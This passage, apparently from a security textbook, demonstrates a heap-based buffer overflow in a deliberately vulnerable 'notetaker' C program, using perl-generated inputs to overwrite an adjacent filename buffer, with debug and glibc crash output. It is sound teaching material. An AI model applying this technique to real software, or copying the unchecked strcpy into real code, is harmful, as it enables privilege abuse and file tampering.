# *__A Basic Heap-Based Overflow__*

The _notetaker_ program from Chapter 2 is also susceptible to a buffer overflow vulnerability. Two buffers are allocated on the heap, and the first command-line argument is copied into the first buffer. An overflow can occur here.

__Excerpt from notetaker.c__

```c
    buffer = (char*) ec_malloc(100);
    datafile = (char*) ec_malloc(20);
    strcpy(datafile, "/var/notes");

    if (argc < 2)                 // If there aren't command-line arguments,
        usage(argv[0], datafile); // display usage message and exit.

    //////////// VULNERABLE LINE ////////////
    strcpy(buffer, argv[1]);      // Copy into buffer.
    //////////// VULNERABLE LINE ////////////

    printf("[DEBUG] buffer @ %p: \'%s\'\n", buffer, buffer);
    printf("[DEBUG] datafile @ %p: \'%s\'\n", datafile, datafile);
```

Under normal conditions, the buffer allocation is located at _0x804a008_, which is before the __datafile__ allocation at _0x804a070_, as the debugging output shows. The distance between these two addresses is _104_ bytes.

<pre style="color: white;">
reader@hacking:~/booksrc $ ./notetaker test
[DEBUG] buffer @ 0x804a008: 'test'
[DEBUG] datafile @ 0x804a070: '/var/notes'
[DEBUG] file descriptor is 3
Note has been saved.
reader@hacking:~/booksrc $ gdb -q
(gdb) p 0x804a070 - 0x804a008
$1 = 104
(gdb) quit
reader@hacking:~/booksrc $
</pre>

Since the first buffer is null terminated, the maximum amount of data that can be put into this buffer without overflowing into the next should be _104_ bytes.

<pre style="color: white;">
reader@hacking:~/booksrc $ ./notetaker $(perl -e 'print "A"x104')
[DEBUG] buffer @ 0x804a008: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[DEBUG] datafile @ 0x804a070: ''
[!!] Fatal Error in main() while opening file: No such file or directory
reader@hacking:~/booksrc $
</pre>

As predicted, when _104_ bytes are tried, the null-termination byte overflows into the beginning of the __datafile__ buffer. This causes the __datafile__ to be nothing but a single null byte, which obviously cannot be opened as a file. But what if the __datafile__ buffer is overwritten with something more than just a null byte?

<pre style="color: white;">
reader@hacking:~/booksrc $ ./notetaker $(perl -e 'print "A"x104 . "testfile"')
[DEBUG] buffer @ 0x804a008: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtestfile'
[DEBUG] datafile @ 0x804a070: 'testfile'
[DEBUG] file descriptor is 3
Note has been saved.
*** glibc detected *** ./notetaker: free(): invalid next size (normal): 0x0804a008 ***
======= Backtrace: =========
/lib/tls/i686/cmov/libc.so.6[0xb7f017cd]
/lib/tls/i686/cmov/libc.so.6(cfree+0x90)[0xb7f04e30]
./notetaker[0x8048916]
/lib/tls/i686/cmov/libc.so.6(__libc_start_main+0xdc)[0xb7eafebc]
./notetaker[0x8048511]
======= Memory map: ========
08048000-08049000 r-xp 00000000 00:0f 44384     /cow/home/reader/booksrc/notetaker
08049000-0804a000 rw-p 00000000 00:0f 44384     /cow/home/reader/booksrc/notetaker
0804a000-0806b000 rw-p 0804a000 00:00 0         [heap]
b7d00000-b7d21000 rw-p b7d00000 00:00 0
b7d21000-b7e00000 ---p b7d21000 00:00 0
b7e83000-b7e8e000 r-xp 00000000 07:00 15444     /rofs/lib/libgcc_s.so.1
b7e8e000-b7e8f000 rw-p 0000a000 07:00 15444     /rofs/lib/libgcc_s.so.1
b7e99000-b7e9a000 rw-p b7e99000 00:00 0
b7e9a000-b7fd5000 r-xp 00000000 07:00 15795     /rofs/lib/tls/i686/cmov/libc-2.5.so
b7fd5000-b7fd6000 r--p 0013b000 07:00 15795     /rofs/lib/tls/i686/cmov/libc-2.5.so
b7fd6000-b7fd8000 rw-p 0013c000 07:00 15795     /rofs/lib/tls/i686/cmov/libc-2.5.so
b7fd8000-b7fdb000 rw-p b7fd8000 00:00 0
b7fe4000-b7fe7000 rw-p b7fe4000 00:00 0
b7fe7000-b8000000 r-xp 00000000 07:00 15421     /rofs/lib/ld-2.5.so
b8000000-b8002000 rw-p 00019000 07:00 15421     /rofs/lib/ld-2.5.so
bffeb000-c0000000 rw-p bffeb000 00:00 0         [stack]
ffffe000-fffff000 r-xp 00000000 00:00 0         [vdso]
Aborted
reader@hacking:~/booksrc $
</pre>

